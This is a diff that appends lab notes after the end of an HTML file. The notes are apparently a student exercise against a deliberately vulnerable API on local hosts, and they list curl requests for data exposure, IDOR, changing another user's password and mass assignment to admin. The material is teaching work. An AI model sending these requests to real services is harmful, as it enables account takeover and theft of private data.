@@ -16,3 +16,80 @@
 <script src="script.js"></script>
 </body>
 </html>
+
+
+curl http://127.0.0.1:5000/createdb
+
+Excessive Data Exposure
+
+curl "http://$BASE/users/v1"
+curl http://IP/users/v1/_debug
+
+Create an Account
+
+Register
+curl -X POST http://127.0.0.1:5000/users/v1/register \
+-H "Content-Type: application/json" \
+-d '{
+  "email":"student1@test.com",
+  "username":"student1",
+  "password":"Password123"
+}'
+
+Login
+curl -X POST http://10.10.0.2:5000/users/v1/login \
+-H "Content-Type: application/json" \
+-d '{
+  "username":"name1",
+  "password":"pass1"
+}'
+
+IDOR
+
+Create a book
+
+curl -X POST http://127.0.0.1:5000/books/v1 \
+-H "Authorization: Bearer $TOKEN" \
+-H "Content-Type: application/json" \
+-d '{
+  "book_title":"MySecretBook",
+  "secret":"This is my private secret"
+}'
+
+View
+
+curl http://127.0.0.1:5000/books/v1
+curl http://127.0.0.1:5000/books/v1/MySecretBook
+
+Unauthorized Password Change
+
+curl -i -X PUT \
+  "$BASE/users/v1/name2/password" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"password":"NewPassword123"}'
+
+Verify the attack
+
+curl -i -X POST "$BASE/users/v1/login" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"name2","password":"NewPassword123"}'
+
+Mass Assignment
+
+Register [Assignment]
+
+curl -i -X POST "$BASE/users/v1/register" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "username":"hacker",
+    "email":"hacker@test.com",
+    "password":"Password123",
+    "admin":true
+  }'
+
+curl "http://$BASE/users/v1"
+
+BONUS ASSIGNMENT [OPTIONAL]
+
+1. SQLI **
